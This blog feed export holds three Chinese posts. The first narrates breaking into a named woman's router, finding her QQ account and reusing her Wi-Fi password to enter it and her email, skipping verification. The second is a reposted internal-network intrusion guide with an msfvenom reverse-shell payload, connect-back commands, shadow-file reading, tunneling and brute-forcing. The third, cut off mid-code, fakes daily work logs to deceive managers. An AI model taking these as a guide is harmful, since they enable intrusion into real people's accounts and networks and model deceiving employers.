      <title><![CDATA[wifi万能钥匙所带来的信息泄漏]]></title>
      <url>http://www.warmeng.com/2017/10/15/wifi-share/</url>
      <content type="html"><![CDATA[<p>手机app，wifi万能钥匙另类玩法，大佬勿喷。</p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>  手机流量超出2个g了，逼不得已下载万能钥匙蹭蹭wifi.这就发生了接下来的故事.</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1.装有wifi万能钥匙的小米手机，因为小米手机连接wifi后可以直接读出wifi密码，这一点非常好。<br>2.附近有共享的wifi</p>
<h2 id="step1"><a href="#step1" class="headerlink" title="step1."></a>step1.</h2><p>连接附近的wifi后读出密码，em…这应该是个妹子的wifi.如图：</p>
<p><img src="/images/20171015/1.png" width="300" height="300"><br><img src="/images/20171015/2.jpg" width="300" height="300"></p>
<p>所以这个妹子的名字是舒丽雅？</p>
<p>接下来进入他的路由器，一般宽带账号会是自己的手机号。在登入路由器的时候输入密码123456发现不成功，直接试wifi密码shuliya123..，成功登入路由器，并且获取到妹子的手机号。</p>
<p><img src="/images/20171015/3.jpg" width="300" height="300"></p>
<p>##step2.<br>得知手机号后，在手机中存入手机号，打开qq通讯录或者微信通讯录，此时可以通过通讯录添加该妹子的qq或者微信。如图</p>
<p><img src="/images/20171015/4.jpg" width="300" height="300"></p>
<p>此时，发现一个问题，这样获取好友的时候没有得到妹子的具体qq号。但是还有办法，qq添加好友处有个条件搜索，我们根据妹子头像，qq名，性别，所在地，锁定妹子的qq号，见图.</p>
<p><img src="/images/20171015/5.jpg" width="300" height="300"></p>
<p>试了一下qq账号密码，发现密码错误，还加了一下妹子，想搭讪的，但是妹子高冷，回了2句话不理我了，哇！难受…..</p>
<p>##step3.<br>哼，这就完了吗，我换wifi再尝试，经过3，4次的尝试过后，终于发现qq密码=wifi密码的组合，也是神了一般的运气，登录qq咯。发现需要手机安全验证，绕过之。<br>下载手机版腾讯安全中心。<br>比如说，腾讯的产品有一种登录方式是安全中心扫码登录。见图：</p>
<p><img src="/images/20171015/6.png" width="300" height="300"></p>
<p>下载手机安全中心，登录账号密码，此时需要验证，更换验证方式，选择跳过验证，账号处于未验证状态。如图所示：</p>
<p><img src="/images/20171015/7.jpg" width="300" height="300"></p>
<p>扫一扫功能扔可以使用！成功登入邮箱，网页qq等一系列的腾讯产品。</p>
<p><img src="/images/20171015/8.png" width="300" height="300"><br><img src="/images/20171015/9.jpg" width="300" height="300"></p>
<p>那个，先不谈妹子的事情了，还记得后面我们绕过登录了qq邮箱的事情吗？通过分析qq邮箱，得到这样的一个地方。这，，，你懂什么是小鹿乱撞吗？啊？啊？啊？<br><img src="/images/20171015/10.jpg" width="300" height="300"></p>
]]></content>
      
        <categories>
            
            <category> 杂项 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 攻略 </tag>
            
            <tag> 实战 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[玩转linux系统之linux内网渗透【转载】]]></title>
      <url>http://www.warmeng.com/2017/08/12/network_infiltration/</url>
      <content type="html"><![CDATA[<p>非原创，转自nmask大佬文章，好东西，分享一波！原帖传送门:<br><a href="http://mp.weixin.qq.com/s/VJBnXq3--0HBD7eVeifOKA" target="_blank" rel="external">http://mp.weixin.qq.com/s/VJBnXq3–0HBD7eVeifOKA</a></p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>  前段时间做了一次不算成功也不算完整的linux内网渗透，不算成功是因为并没有拿下内网中其他服务器的权限，不算完整是因为由于某些原因测试被迫暂时中止。虽然这次linux内网渗透不算是一个很好的教学案例，但我还是决定把过程记录一下，尤其重点记录linux内网渗透的思路，以防遗忘。<br>  网上关于内网渗透的资料很多，我在做测试之前也是翻阅了很多资料。本篇标题突出linux，是因为本次测试不涉及windows系统，当然linux与windows内网渗透的原理差不多，只不过使用的工具有所区别。</p>
<h2 id="收集测试网络环境"><a href="#收集测试网络环境" class="headerlink" title="收集测试网络环境"></a>收集测试网络环境</h2><p>当我们拿到一台目标内网服务器，或者说肉鸡服务器，首先要做的就是收集信息。而在我看来需要收集的信息中，最重要的之一便是肉鸡的网络环境。</p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>首先介绍下本次测试的服务器环境：</p>
<pre><code>攻击机Mac：110.xx.xx.xx 外网

肉鸡centos：192.168.16.x 目标内网16网段系统

内网渗透范围：192.168.17.0/24 目标内网17网段系统
</code></pre><p>本次测试模拟假设：由于肉鸡服务器上对外开放了存在漏洞的web应用，被入侵植入webshell。<br>本次测试目的：通过肉鸡服务器上的shell，深入渗透内网17网段的服务器。</p>
<h2 id="收集测试哪些网络数据？"><a href="#收集测试哪些网络数据？" class="headerlink" title="收集测试哪些网络数据？"></a>收集测试哪些网络数据？</h2><p>ok，目前我已经拥有了肉鸡的shell，那么该收集肉鸡服务器的哪些网络环境呢？又该如何去测试？我认为至少要收集以下几点网络环境信息：</p>
<pre><code>肉鸡服务器与外网的连通性

肉鸡服务器与内网其他网段的连通性

肉鸡服务器与外网之间是否有端口访问限制

肉鸡服务器与内网其他网段之间是否有端口访问限制
</code></pre><p>注：连通性主要是指能否ping通，需要双方互相ping测试；端口访问限制，指的是目标网络边界是否有堡垒机或者防火墙，对进出的端口是否有做限制。</p>
<h2 id="端口访问限制测试"><a href="#端口访问限制测试" class="headerlink" title="端口访问限制测试"></a>端口访问限制测试</h2><p>ping测试这里不介绍了，主要说下如何测试端口访问限制，可以使用的工具如下：</p>
<pre><code>curl、wget（可连接web服务，主要为80、443、8000+端口）

telnet（可主动连接指定ip的指定port）

nmap（可扫描端口，open或者filter）

ncat（可以创建端口监听，也可以主动连接）

python（可主动创建端口监听）
……
</code></pre><p>在测试端口访问限制前，我们先要搞清楚当前的网络环境。本次测试中，攻击机在外网而肉鸡在内网，因此正常情况下攻击机是无法直接访问到肉鸡上某个端口的（需要网络边界路由器做端口映射）。</p>
<h3 id="反向连接测试"><a href="#反向连接测试" class="headerlink" title="反向连接测试"></a>反向连接测试</h3><p>我们在测试端口访问限制时，首先可以利用ncat在攻击机上监听一个端口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ncat <span class="_">-l</span> -p 999</div></pre></td></tr></table></figure></p>
<p>然后利用ncat或者telnet等工具在肉鸡上尝试连接，我称之为反向连接测试。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ncat 110.xx.xx.xx 9999</div></pre></td></tr></table></figure></p>
<p>注：监听的端口可以随机选取，尽量选取多个端口尝试多次；如果肉鸡能够访问攻击机的任何端口，说明目标网络边界没有对出方向的连接做限制，了解这方面的信息对后面的端口转发有很大好处。</p>
<h3 id="正向连接测试"><a href="#正向连接测试" class="headerlink" title="正向连接测试"></a>正向连接测试</h3><p>我们也可以在肉鸡上监听一个端口，攻击机上尝试连接（这里连接的是肉鸡的外网ip地址，肉鸡对外开放的web应用肯定是以一个外网ip或者域名的形式存在，而该ip在本次测试中并不是肉鸡真正的ip地址，是目标边界网络设备的ip，原理是通过端口映射将网络设备（外网ip）上的web端口映射到了肉鸡（内网ip）的web端口上），我称之为正向连接测试。<br>　　尝试连接肉鸡外网地址的端口，意义在于有些粗心的管理员会在网络设备上设置全端口映射，也就是说肉鸡上监听任何端口都能映射到网络边界设备的相同端口上，那么这跟肉鸡服务器直接处在外网就没差了。</p>
<h2 id="收集服务器信息"><a href="#收集服务器信息" class="headerlink" title="收集服务器信息"></a>收集服务器信息</h2><p>收集信息可以说是渗透测试的第一步，内网渗透也一样，收集的服务器信息越多，渗透的成功率就越大。</p>
<h2 id="查看系统内核"><a href="#查看系统内核" class="headerlink" title="查看系统内核"></a>查看系统内核</h2><p>linux系统上查看内核版本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsb_release –a</div></pre></td></tr></table></figure></p>
<p>　　一般系统的入侵途径是先提权，而提权可以通过linux内核漏洞进行，因此可以先查看linux内核版本，然后根据内核寻找exp的网站，上传exp进行提权。由于本次测试不涉及提权部分，因此不做测试，另外补充一句：内核提权有宕机风险，请谨慎操作。</p>
<h2 id="查看操作系统位数"><a href="#查看操作系统位数" class="headerlink" title="查看操作系统位数"></a>查看操作系统位数</h2><p>linux系统上查看位数如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div></pre></td></tr></table></figure></p>
<p>说明：知道系统是32位还是64位对后期生成msf木马有帮助。</p>
<h2 id="系统敏感信息"><a href="#系统敏感信息" class="headerlink" title="系统敏感信息"></a>系统敏感信息</h2><p>收集一些系统相关的敏感信息，比如账号密码、日志、历史命令、ssh文件等。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/etc/shadow</div><div class="line">/etc/passwd</div><div class="line">/var/<span class="built_in">log</span></div><div class="line"><span class="built_in">history</span></div><div class="line">.ssh</div><div class="line">......</div></pre></td></tr></table></figure></p>
<h2 id="web敏感信息"><a href="#web敏感信息" class="headerlink" title="web敏感信息"></a>web敏感信息</h2><p>如果服务器存在web应用，可以查看web目录下是否存在敏感信息，比如连接数据库的配置文件等等。</p>
<h2 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h2><p>　　当信息收集完成后，可以尝试扫描一下内网的机器，比如主机存活扫描、端口扫描、arp扫描等。端口扫描可以使用nmap、msf等工具，但如果服务器上没有安装这些工具时，通常有3种手段可以达到内网端口扫描的效果。第一种就是服务器上安装扫描工具，这里不多说也不推荐，因为动静大且麻烦；第二种就是端口转发，将服务器内网端口转发到外网进行扫描；第三种就是代理扫描，也就是把装有扫描工具的攻击机代理到目标内网环境。<br>　　无论是端口转发扫描还是代理扫描，原理都是打通攻击机（外网）与肉鸡（内网）的连通性，即让攻击机可以直接访问到肉鸡所在的内网资源。这里的连接不借助于目标网络边界设备的端口映射功能，因此与攻击机访问肉鸡web服务所产生的连接有所区别。</p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>　　想要达到以上所介绍的彼此”直接”的连接，我们需要一个中间的桥梁，来传递内外网（攻击机与肉鸡）之间的数据。搭建这种桥梁的方式有很多，我们首先可以想到端口转发，即把肉鸡服务器上的某个端口转发到攻击机的某个端口上，这样攻击机上访问本机某个端口，就相当于访问了肉鸡服务器上的某个端口。</p>
<p>端口转发的工具：lcx、meterpreter等，具体用法后面会介绍<br>端口转发类型：tcp端口转发、http转发、ssh转发等</p>
<h2 id="tcp端口转发"><a href="#tcp端口转发" class="headerlink" title="tcp端口转发"></a>tcp端口转发</h2><p>本机转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发肉鸡22端口。<br>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">肉鸡22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口</div></pre></td></tr></table></figure></p>
<p>注：此时我们去连接攻击机的3333端口，就相当于连接了肉鸡的22端口。</p>
<p>远程转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发内网目标服务器的22端口。（前提是肉鸡能够连接目标服务器的22端口）<br>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">内网目标服务器22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口</div></pre></td></tr></table></figure></p>
<p>注：此时我们去连接攻击机的3333端口，就相当于连接了目标服务器的22端口。<br>说明：从上面的连接过程不难看出，端口转发比较难以防范的原因就在于，攻击机上监听的端口是随机的，不可预知的，因此不可能事先在堡垒机或者防火墙上做出方向的端口策略，除非禁止服务器访问外部所有端口（现实情况大多只对进方向的端口连接做限制）。</p>
<h2 id="http转发"><a href="#http转发" class="headerlink" title="http转发"></a>http转发</h2><p>　　有些安全意思强的管理员，会对一些服务器做禁止访问外网的策略，即服务器禁止连接任何外网的端口。此时普通的tcp端口转发就没有效果了，因为转发的前提是要能互相连接上。此种情况，可以使用http转发。<br>转发连接原理：<br>肉鸡web端口(80)&lt;–&gt;网络边界设备端口(80)&lt;–&gt;攻击机随机端口<br>注：这里之所以能够连通，是借助了服务器上的web服务，以及网络边界设备的映射功能。</p>
<p>说明：虽然肉鸡不能访问外网任何端口，但只要它对外提供web服务，就说明它还能跟外界通信，只不过这种通信局限于web服务端口中，并且肉鸡不是直接跟攻击机通信，而是借助了边界设备。</p>
<h2 id="代理扫描内网"><a href="#代理扫描内网" class="headerlink" title="代理扫描内网"></a>代理扫描内网</h2><p>　　以上介绍了几种端口转发的使用以及原理，从中我们不难看出端口转发固然厉害，但也很局限，因为每次都只能转发一个ip的一个端口，对于扫描来说，并不是最好的选择方案。因此出现了一种更好的技术方案–代理扫描，其原理与端口转发差不多，都是需要搭建一个桥梁，而这个桥梁往往不是某个端口，而是shell或者说session。</p>
<p>代理扫描同样可以分为tcp代理扫描、http代理扫描。</p>
<h3 id="http代理转发"><a href="#http代理转发" class="headerlink" title="http代理转发"></a>http代理转发</h3><p>如果目标服务器有web系统，可以使用Regeorg + proxychains。<br>工具下载：reGeorg、proxychains<br>将reGeorg的tunnel文件上传到肉鸡服务器到网站目录下，攻击机执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python reGeorgSocksProxy.py -p 2333 -u http://test.com/tunnel.php</div></pre></td></tr></table></figure></p>
<p>然后修改proxychains.conf 配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/proxychains.conf   （mac上在~/.proxychains/proxychains.conf ,没有则自己创建）</div></pre></td></tr></table></figure></p>
<p>在最后一行添加socks5 127.0.0.1 2333(与regeorg设置的端口相同)</p>
<p>最后在攻击机使用扫描工具时，可以在执行的命令前加proxhchains4, 比如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains4 nmap <span class="_">-s</span>T -Pn -n 192.168.16.0/24</div></pre></td></tr></table></figure></p>
<p>注：此方案适合攻击者与肉鸡服务器都在各自内网环境，攻击者可以访问到目标服务器的http服务，通过该http服务进行代理转发（速度较慢）.</p>
<h3 id="tcp代理转发"><a href="#tcp代理转发" class="headerlink" title="tcp代理转发"></a>tcp代理转发</h3><p>思路：通过metasploit木马反弹一个肉鸡的meterpreter shell到攻击机上，然后在meterpreter shell上设置路由，我们便可以在攻击机上直接扫描肉鸡所在的网段服务器（这里是可以跨网段扫描的）。</p>
<h3 id="生成msf木马"><a href="#生成msf木马" class="headerlink" title="生成msf木马"></a>生成msf木马</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=8000 <span class="_">-f</span> elf &gt; shell_8000.elf</div></pre></td></tr></table></figure>
<p>由于攻击机无法访问肉鸡的端口，而肉鸡可以访问攻击机的端口，因此生成一个反向的木马。</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>　　攻击机运行msfconsole，使用exoloit/multi/handler模块，set payload linux/x86/meterpreter/reverse_tcp跟生成木马时用的payload一样。LPORT设置成木马将要连接的端口，运行后会在攻击机上监听一个端口，等待木马链接。<br>　　此时将shell_8000.elf上传到肉鸡服务器上，添加权限后运行木马将会主动连接上攻击机监听的端口，并在攻击机上获取一个meterpreter shell。</p>
<h3 id="设置路由"><a href="#设置路由" class="headerlink" title="设置路由"></a>设置路由</h3><p>上一步获取到了一个session，这个session是攻击机与肉鸡相互连接的会话。<br>查看下肉鸡的网络情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run get_local_subnets</div></pre></td></tr></table></figure></p>
<p>添加路由:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run autoroute <span class="_">-s</span> 192.168.16.0/24</div></pre></td></tr></table></figure></p>
<p>查看路由：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run autoroute –p</div></pre></td></tr></table></figure></p>
<p><img src="/images/20170812/1.jpg" alt=""><br>一般来说，这里设置好路由就可以了，但是有些时候会发现在meterpreter中有效果，但是在msf中失效了，因此可以在msf中再设置一次。（但前提是meterpreter会话要一直存在）将该会话放入后台，进入msf中添加路由。<br>查看路由：<br><img src="/images/20170812/2.jpg" alt=""><br>这里已经是添加好的结果，添加路由命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; route add 192.168.16.0 255.255.255.0 12</div><div class="line">msf exploit(handler) &gt; route add 192.168.17.0 255.255.255.0 12</div></pre></td></tr></table></figure></p>
<p>注意：12表示session id，由于我们需要访问17网段，因此这里也要添加17网段的路由。</p>
<p>说明：以上2条路由的意思，是攻击机如果要去访问17或者16网段的资源，其下一跳是session12，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</p>
<h3 id="tcp全局代理转发"><a href="#tcp全局代理转发" class="headerlink" title="tcp全局代理转发"></a>tcp全局代理转发</h3><p>　　通过以上设置，在msf中可以访问内网资源了，但也仅限在msf中可以访问。如果想要其他工具也能使用代理，则要设置全局代理，这需要使用msf框架中的socks4a工具代理，目录：auxiliary/server/socks4a，然后配合Proxychains ，使用方法跟http代理类似。</p>
<p>注：此代理不是http代理，是tcp代理，因此需要目标服务器或者攻击者服务器，有一方在外网的环境，不然木马端口无法连接，也就无法获取meterpreter shell。</p>
<h2 id="端口扫描工具"><a href="#端口扫描工具" class="headerlink" title="端口扫描工具"></a>端口扫描工具</h2><p>推荐使用metasploit进行tcp代理转发后，利用msf上面整合的很多扫描模块，直接进行扫描。<br>扫描模块：</p>
<pre><code>auxiliary/scanner/portscan　　端口扫描

scanner/portscan/syn　　SYN端口扫描

scanner/portscan/tcp　　TCP端口扫描
……
</code></pre><p>除此之外，也可以使用nmap等扫描工具，结合tcp全局代理转发即可。</p>
<h2 id="针对22端口的入侵"><a href="#针对22端口的入侵" class="headerlink" title="针对22端口的入侵"></a>针对22端口的入侵</h2><p>　　扫描出内网服务器端口后，我们可以首先选择开放22端口的服务器进行入侵尝试。攻击22端口通常有2种方法，第一种是先读取肉鸡明文密码，再利用明文密码尝试登陆；第二种是字典暴力登陆。</p>
<h2 id="尝试hash破解"><a href="#尝试hash破解" class="headerlink" title="尝试hash破解"></a>尝试hash破解</h2><p>如果权限足够，我们可以顺利读取/etc/shadow文件的内容，然而是密文的，因此可以尝试用工具破解。</p>
<pre><code>John破解hash

Hashcat
</code></pre><p>注：windows下可以使用mimikatz</p>
<p>说明：获取linux账号的明文密码作用很大，因为内网环境管理员可能就那么几个，不同服务器所设置的密码也有可能相同，因此可以使用获取的服务器密码去尝试登陆其余开放了22端口的内网服务器.</p>
<h2 id="字典暴力破解"><a href="#字典暴力破解" class="headerlink" title="字典暴力破解"></a>字典暴力破解</h2><p>这个没啥好说的，主要看字典是否强大，以及是否有防止爆破限制。<br>工具：</p>
<pre><code>hydra

msf上的相应模块
</code></pre><h2 id="针对其他端口的入侵"><a href="#针对其他端口的入侵" class="headerlink" title="针对其他端口的入侵"></a>针对其他端口的入侵</h2><p>　　除了22端口外，21（ftp）、3306（mysql）、1433（mssql）等都可以通过暴力破解的方式。那么其他段端口呢？比如445、443等，这些则可以通过相应的漏洞进行攻击，通过可以使用nessus扫描器进行扫描，对发现的漏洞再集合msf上相应的模块进行攻击。</p>
<h2 id="针对web服务的入侵"><a href="#针对web服务的入侵" class="headerlink" title="针对web服务的入侵"></a>针对web服务的入侵</h2><p>　　除了以上的端口外，还有一类端口比较特殊，那就是web服务类的端口，比如80、443、8000+等。由于这些端口上存在web应用，而web应用又是容易存在漏洞的点。因此可以重点寻找内网中存在web服务的服务器，并依照web渗透测试的流程对其web应用进行渗透。</p>
<h2 id="端口转发的逆袭"><a href="#端口转发的逆袭" class="headerlink" title="端口转发的逆袭"></a>端口转发的逆袭</h2><p>　　前文介绍了端口转发技术，但在扫描环节中我并没有使用这种方案。那么是不是说端口转发在内网渗透中没有用武之地呢？<br>　　事实并不是这样，内网扫描过后的漏洞利用攻击阶段，才是端口转发真正的舞台。在此阶段，我们可以利用端口转发，将某个存在漏洞的服务器的某个端口转发出来，单独攻击利用。我们可以想到在windows中，利用lcx转发3389端口，linux下同样可以转发22端口，当然更好用的是转发80端口，达到可以本地访问内网的web服务，从而继续web渗透的套路，扩大攻击面。</p>
<h2 id="meterpreter实现端口转发"><a href="#meterpreter实现端口转发" class="headerlink" title="meterpreter实现端口转发"></a>meterpreter实现端口转发</h2><p>在meterpreter shell中输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; portfwd add <span class="_">-l</span> 55555 -r 192.168.16.1 -p 3306</div></pre></td></tr></table></figure></p>
<p>说明：表示将192.168.16.1服务器上的3306端口转发到本地（攻击机）的55555端口，然后我们可以在本地运行mysql –h 127.0.0.1 –u root –P 55555 –p 去登陆内网服务器的mysql。其他端口如ssh、ftp等都类似，这个过程跟msf代理很像。</p>
<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>将肉鸡的22端口转发到攻击机的2222端口，看一下连接情况。<br>发现攻击机上监听了2222端口，连接到了本机其外一个高端口。<br><img src="/images/20170812/3.jpg" alt=""><br>肉鸡的22端口也连接到了肉鸡自己的一个高端口<br>那么两台服务器之间的两个高端口之间是怎么连接的，我想肯定是利用meterpreter会话。因此meterpreter会话就相当于一个中间人，传递原本无法传递的消息。</p>
<h2 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a>lcx端口转发</h2><p>请直接看攻略<a href="/2017/04/19/r&amp;l/">lcx转发</a></p>
<h2 id="内网嗅探"><a href="#内网嗅探" class="headerlink" title="内网嗅探"></a>内网嗅探</h2><p>　　windows下可以使用cain，linux下可以使用msf中的模块。当然一般情况下，最好不要用内网嗅探，因为动静太大，而且可能会影响内网网络。</p>
<h2 id="linux内网安全建议"><a href="#linux内网安全建议" class="headerlink" title="linux内网安全建议"></a>linux内网安全建议</h2><p>说了这么多内网渗透的套路，按惯例最后该给出内网安全建设的几点建议了，当然只是个人看法。</p>
<pre><code>每台服务器上安装waf或者云盾，监控并拦截木马程序的运行

监控服务器上开启的新端口，查看其连接情况，是否有异常连接

服务器及时更新补丁

服务器上运行的应用给予低权限
</code></pre>]]></content>
      
        <categories>
            
            <category> 攻略 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 攻略 </tag>
            
            <tag> 实战 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[上班族福利：每日日志自动生成发送]]></title>
      <url>http://www.warmeng.com/2017/08/04/daily/</url>
      <content type="html"><![CDATA[<p>日志这个东西，你认真写，上面真的会认真看吗？真的有用吗？既然如此，以形式主义针对形式主义！<br>可能就是懒癌晚期了吧@_@!</p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>偶然间看到C++的邮件自动发送，感觉还不错！</p>
<h2 id="step1-日志自动生成功能"><a href="#step1-日志自动生成功能" class="headerlink" title="step1.日志自动生成功能"></a>step1.日志自动生成功能</h2><p>不同的公司需要的日志格式是不同的，针对自己的公司的日志格式，自动生成了日志。<br>日志生成效果如图：<br><img src="/images/20170804/1.png" alt=""><br>生成一个工作目标的字典，使用随机数的方式选取目标。在对工作的内容进行随机抽取。字符串拼接，生成日志。附代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">def msg():</div><div class="line"> </div><div class="line">    messeage1 = <span class="string">' 一、本日主要工作\n'</span></div><div class="line">    i0 = random.randint(0, 20)</div><div class="line">    sy = open(<span class="string">'system.txt'</span>, <span class="string">'r'</span>)</div><div class="line">    sylines = sy.readlines()</div><div class="line">    messeage2 = sylines[i0]</div><div class="line">    messeage2 = str.strip(messeage2)</div><div class="line"></div><div class="line">    i1 = random.randint(4, 7)</div><div class="line">    vn = open(<span class="string">'vulnerability.txt'</span>, <span class="string">'r'</span>)</div><div class="line">    vnlines = vn.readlines()</div><div class="line">    vninfos = random.sample(vnlines, i1)</div><div class="line">    vn_num = str(i1) + <span class="string">'个漏洞'</span></div><div class="line">    infos = []</div><div class="line">    <span class="keyword">for</span> vninfo <span class="keyword">in</span> vninfos:</div><div class="line">        info = str.strip(vninfo)</div><div class="line">        infos.append(info)</div><div class="line"></div><div class="line">    vnquanxian = [<span class="string">'XXXXXXXXX漏洞（高危）'</span>, <span class="string">'XXXXXXXXXX（高危）'</span>, <span class="string">'XXXXXXXXXX漏洞（高危）'</span>, <span class="string">'XXXXXXXXXX（高危）'</span>,</div><div class="line">                  <span class="string">'XXXXXXXXX（高危）'</span>]</div><div class="line">    panduan = <span class="string">'否'</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> vnquanxian:</div><div class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> infos:</div><div class="line">            <span class="keyword">if</span> x == y:</div><div class="line">                panduan = <span class="string">'是'</span></div><div class="line">    messeage3 = <span class="string">'\n'</span> + str(i1) + <span class="string">'个漏洞'</span> + <span class="string">'\n'</span> + <span class="string">'是否获得获得权限：'</span> + panduan + <span class="string">'\n'</span></div><div class="line">    </div><div class="line">    messeage4 = <span class="string">'其中漏洞有：'</span> + <span class="string">'\n'</span></div><div class="line">    <span class="keyword">for</span> info <span class="keyword">in</span> infos:</div><div class="line">        messeage4 = messeage4 + info + <span class="string">'\n'</span></div><div class="line">    messeage4 = messeage4</div><div class="line">  </div><div class="line">    messeage5 = <span class="string">'二、存在问题\n'</span> + <span class="string">'无\n'</span> + <span class="string">'三、明日计划\n'</span> + <span class="string">'其他系统的渗透测试'</span></div><div class="line">    messeage6 = <span class="string">'\n'</span></div><div class="line">    e = open(<span class="string">'end.txt'</span>, <span class="string">'r'</span>)</div><div class="line">    lines = e.readlines()</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">        messeage6 = messeage6 + str.strip(line) + <span class="string">'\n'</span></div><div class="line"></div><div class="line">    messeage = messeage1 + messeage2 + messeage3 + messeage4 + messeage5 + messeage6</div><div class="line">    <span class="built_in">return</span> messeage</div><div class="line"><span class="built_in">print</span> msg()</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="step2-邮件发送"><a href="#step2-邮件发送" class="headerlink" title="step2.邮件发送"></a>step2.邮件发送</h2><p>使用stmp自动发送邮件，，建议在给你领导发的时候同时给自己的小号邮箱也发一封，以确保邮件每天正常的发送。<br>附代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">mail_host=<span class="string">"smtp.ym.163.com"</span></div><div class="line">mail_user=<span class="string">"你发送邮件的邮箱"</span></div><div class="line">mail_pass=<span class="string">"你的邮箱密码"</span></div><div class="line">sender = <span class="string">'发送者'</span></div><div class="line">receivers = [<span class="string">'你的领导'</span>,<span class="string">'你的领导2号'</span>,<span class="string">'你的小号邮箱'</span>]</div><div class="line">def send_email():</div><div class="line">    now_time = datetime.datetime.now()</div><div class="line">    date_now = str(now_time)[0:10]</div><div class="line">    <span class="built_in">print</span> date_now</div><div class="line"></div><div class="line">    info = MIMEMultipart()</div><div class="line">    info[<span class="string">"from"</span>] = sender</div><div class="line"></div><div class="line">    info[<span class="string">"subject"</span>] = date_now + <span class="string">'日志'</span></div><div class="line"></div><div class="line">    txt = 